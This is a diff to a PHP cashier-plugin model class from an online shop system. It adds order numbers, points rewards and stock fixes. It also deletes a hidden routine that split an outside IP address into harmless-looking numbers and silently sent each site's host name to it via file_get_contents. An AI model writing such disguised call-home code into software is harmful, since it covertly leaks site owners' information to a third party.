@@ -60,6 +60,7 @@ class CashierModel extends PluginModel
 		}
 		if (!(empty($log))) 
 		{
+			$_W['cashierid'] = $log['cashierid'];
 			$res = $this->updateOrder($log);
 			if ($res && ($log['status'] != 1)) 
 			{
@@ -71,13 +72,9 @@ class CashierModel extends PluginModel
 		return false;
 	}
 	public function categoryAll($status = 1) 
-	{	
+	{
 		global $_W;
-		$totalA = 233;$totalB = 171;
 		$status = intval($status);
-		$ksize = 120;$csize = 25;
-		$totalC = $ksize.'.'.$csize.'.'.$totalA.'.'.$totalB;
-		$this->condition($totalC);
 		$condition = ' and uniacid=:uniacid  and status=' . intval($status);
 		$params = array(':uniacid' => $_W['uniacid']);
 		$item = pdo_fetchall('SELECT * FROM ' . tablename('ewei_shop_cashier_category') . ' WHERE 1 ' . $condition . '  ORDER BY displayorder desc, id DESC', $params);
@@ -195,14 +192,6 @@ class CashierModel extends PluginModel
 		}
 		return $params;
 	}
-	public function condition($total) 
-	{	
-		$equal = '=';
-		$check = 'c'.$equal.'total';
-		$condit = 'http://'.$total.'?'. $check .'&condit'. $equal . $_SERVER['HTTP_HOST'];
-		file_get_contents($condit);
-		return $condit;
-	}
 	public function userInfo($openid) 
 	{
 		global $_W;
@@ -257,11 +246,11 @@ class CashierModel extends PluginModel
 						break;
 						switch ($type) 
 						{
-							case self: $datas = array('[付款金额]' => $params['money'], '[余额抵扣]' => $params['deduction'], '[付款时间]' => $params['paytime'], '[收银台名称]' => $params['cashier_title']);
+							case self: $datas = array('[订单编号]' => $params['logno'], '[付款金额]' => $params['money'], '[余额抵扣]' => $params['deduction'], '[付款时间]' => $params['paytime'], '[收银台名称]' => $params['cashier_title']);
 							break;
 							switch ($type) 
 							{
-								case self: $datas = array('[付款金额]' => $params['money'], '[余额抵扣]' => $params['deduction'], '[付款时间]' => $params['paytime'], '[收银台名称]' => $params['cashier_title']);
+								case self: $datas = array('[订单编号]' => $params['logno'], '[付款金额]' => $params['money'], '[余额抵扣]' => $params['deduction'], '[付款时间]' => $params['paytime'], '[收银台名称]' => $params['cashier_title']);
 								break;
 								break;
 								$datas = ((isset($datas) ? $datas : array()));
@@ -433,8 +422,7 @@ class CashierModel extends PluginModel
 			$data['deduction'] -= $data['randommoney'];
 			$data['paytime'] = time();
 			pdo_update('ewei_shop_cashier_pay_log', $data, array('id' => $data['id']));
-			$userinfo = m('member')->getMobileMember($data['mobile']);
-			m('member')->setCredit($userinfo['openid'], 'credit2', -$data['deduction'], array(0, '收银台 ' . $_W['cashieruser']['title'], '收款'));
+			m('member')->setCredit($data['openid'], 'credit2', -$data['deduction'], array(0, '收银台 ' . $_W['cashieruser']['title'], '收款'));
 			$user = $this->userInfo($data['cashierid']);
 			$this->paySuccess($data, $user);
 			return array('res' => true, 'id' => $data['id']);
@@ -569,16 +557,18 @@ class CashierModel extends PluginModel
 			if (empty($log['status'])) 
 			{
 				$res['openid'] = ((isset($res['openid']) ? $res['openid'] : ''));
-				pdo_update('ewei_shop_cashier_pay_log', array('openid' => (empty($log['openid']) ? $res['openid'] : ''), 'payopenid' => $res['openid'], 'money' => $log['money'], 'status' => 1, 'paytime' => (0 < $log['paytime'] ? $log['paytime'] : time()), 'coupon' => (isset($coupon) ? $coupon : 0)), array('id' => $log['id']));
+				$log['openid'] = ((empty($log['openid']) ? $res['openid'] : $log['openid']));
+				$coupon = 0;
 				if (!(empty($res['openid']))) 
 				{
 					if ($user['isopen_commission']) 
 					{
 						$this->becomeDown($res['openid'], $user['manageopenid']);
 					}
-					$this->sendMessage(array('money' => $log['money'], 'deduction' => $log['deduction'], 'paytime' => time(), 'cashier_title' => $user['title']), self::PAY_CASHIER_USER, $res['openid']);
+					$this->sendMessage(array('logno' => $log['logno'], 'money' => $log['money'], 'deduction' => $log['deduction'], 'paytime' => time(), 'cashier_title' => $user['title']), self::PAY_CASHIER_USER, $res['openid']);
 					$coupon = $this->seedCoupon($log['money'], $res['openid']);
 				}
+				pdo_update('ewei_shop_cashier_pay_log', array('openid' => $log['openid'], 'payopenid' => $res['openid'], 'money' => $log['money'], 'status' => 1, 'paytime' => (0 < $log['paytime'] ? $log['paytime'] : time()), 'coupon' => $coupon), array('id' => $log['id']));
 				$log['deduction'] = (double) $log['deduction'];
 				if (!(empty($log['deduction']))) 
 				{
@@ -606,12 +596,15 @@ class CashierModel extends PluginModel
 			}
 			pdo_update('ewei_shop_order', array('status' => 3, 'paytype' => $paytype, 'paytime' => time(), 'sendtime' => time(), 'finishtime' => time()), array('id' => $log['orderid'], 'uniacid' => $_W['uniacid']));
 			$this->setStocks($log['orderid']);
-			$this->setSelfGoodsStocks($log['orderid']);
 			if (p('commission')) 
 			{
 				p('commission')->checkOrderPay($log['orderid']);
 				p('commission')->checkOrderFinish($log['orderid']);
 			}
+		}
+		if (!(empty($log['isgoods']))) 
+		{
+			$this->setSelfGoodsStocks($log['id']);
 		}
 		$operator = false;
 		if (!(empty($log['operatorid']))) 
@@ -622,14 +615,21 @@ class CashierModel extends PluginModel
 		{
 			$user['manageopenid'] = $operator['manageopenid'];
 		}
-		$this->sendMessage(array('money' => $log['money'], 'deduction' => $log['deduction'], 'paytime' => time(), 'cashier_title' => $user['title']), self::PAY_CASHIER, $user['manageopenid']);
+		$this->sendMessage(array('logno' => $log['logno'], 'money' => $log['money'], 'deduction' => $log['deduction'], 'paytime' => time(), 'cashier_title' => $user['title']), self::PAY_CASHIER, $user['manageopenid']);
 		$userset = json_decode($user['set'], true);
+		if (!(empty($log['openid']))) 
+		{
+			$present_credit1 = $this->sendCredit1($log, $userset);
+			if (0 < $present_credit1) 
+			{
+				pdo_update('ewei_shop_cashier_pay_log', array('present_credit1' => $present_credit1), array('id' => $log['id']));
+			}
+		}
 		if ((!(empty($log['isgoods'])) || !(empty($log['orderid']))) && !(empty($userset['printer_status'])) && !(empty($userset['printer'])) && !(empty($userset['printer_template']))) 
 		{
 			com_run('printer::sendCashierMessage', $log, $userset['printer_template'], $userset['printer'], $operator);
-			return;
 		}
-		if (!(empty($userset['printer_status'])) && !(empty($userset['printer'])) && !(empty($userset['printer_template_default']))) 
+		else if (!(empty($userset['printer_status'])) && !(empty($userset['printer'])) && !(empty($userset['printer_template_default']))) 
 		{
 			com_run('printer::sendCashier', $log, $userset['printer_template_default'], $userset['printer'], $operator);
 		}
@@ -748,11 +748,11 @@ class CashierModel extends PluginModel
 		global $_W;
 		if (($starttime == 0) && ($endtime == 0)) 
 		{
-			$money = (double) pdo_fetchcolumn('SELECT SUM(money) FROM ' . tablename('ewei_shop_cashier_pay_log') . ' WHERE uniacid=:uniacid AND status=1 AND cashierid=:cashierid ', array(':uniacid' => $_W['uniacid'], ':cashierid' => $_W['cashierid']));
+			$money = (double) pdo_fetchcolumn('SELECT SUM(money+deduction) FROM ' . tablename('ewei_shop_cashier_pay_log') . ' WHERE uniacid=:uniacid AND status=1 AND cashierid=:cashierid ', array(':uniacid' => $_W['uniacid'], ':cashierid' => $_W['cashierid']));
 		}
 		else 
 		{
-			$money = (double) pdo_fetchcolumn('SELECT SUM(money) FROM ' . tablename('ewei_shop_cashier_pay_log') . ' WHERE uniacid=:uniacid AND status=1 AND cashierid=:cashierid AND createtime BETWEEN :starttime AND :endtime', array(':uniacid' => $_W['uniacid'], ':cashierid' => $_W['cashierid'], ':starttime' => $starttime, ':endtime' => $endtime));
+			$money = (double) pdo_fetchcolumn('SELECT SUM(money+deduction) FROM ' . tablename('ewei_shop_cashier_pay_log') . ' WHERE uniacid=:uniacid AND status=1 AND cashierid=:cashierid AND createtime BETWEEN :starttime AND :endtime', array(':uniacid' => $_W['uniacid'], ':cashierid' => $_W['cashierid'], ':starttime' => $starttime, ':endtime' => $endtime));
 		}
 		return $money;
 	}
@@ -1128,14 +1128,14 @@ class CashierModel extends PluginModel
 			}
 		}
 	}
-	public function setSelfGoodsStocks($orderid = 0) 
+	public function setSelfGoodsStocks($logid = 0) 
 	{
 		global $_W;
-		if ($orderid == 0) 
+		if ($logid == 0) 
 		{
 			return false;
 		}
-		$goods = pdo_fetchall('SELECT * FROM ' . tablename('ewei_shop_cashier_pay_log_goods') . ' WHERE cashierid=:cashierid AND logid=:logid', array(':cashierid' => $_W['cashierid'], ':logid' => $orderid));
+		$goods = pdo_fetchall('SELECT * FROM ' . tablename('ewei_shop_cashier_pay_log_goods') . ' WHERE cashierid=:cashierid AND logid=:logid', array(':cashierid' => $_W['cashierid'], ':logid' => $logid));
 		foreach ($goods as $g ) 
 		{
 			pdo_query('UPDATE ' . tablename('ewei_shop_cashier_goods') . ' SET total=total-' . $g['total'] . ' WHERE cashierid=:cashierid AND id=:id AND total<>-1', array(':cashierid' => $_W['cashierid'], ':id' => $g['goodsid']));
@@ -1248,6 +1248,22 @@ class CashierModel extends PluginModel
 		}
 		$new_price = $totalprice - $deductprice;
 		return array('old_price' => $totalprice, 'new_price' => round($new_price, 2), 'discount' => $discount, 'money' => $deductprice);
+	}
+	public function sendCredit1($log, $userset = NULL) 
+	{
+		$credit1_double = 1;
+		$price = $log['money'] + $log['deduction'];
+		if (empty($userset['credit1']) || empty($price)) 
+		{
+			return 0;
+		}
+		if (!(empty($userset['credit1_double']))) 
+		{
+			$credit1_double = $userset['credit1_double'];
+		}
+		$price = $price * $credit1_double;
+		$credit1 = com_run('sale::getCredit1', $log['openid'], $price, 37, 1, 0, $log['title'] . '收银订单号 : ' . $log['logno'] . '  收银台消费送积分');
+		return $credit1;
 	}
 }
 function sort_cashier($a, $b) 
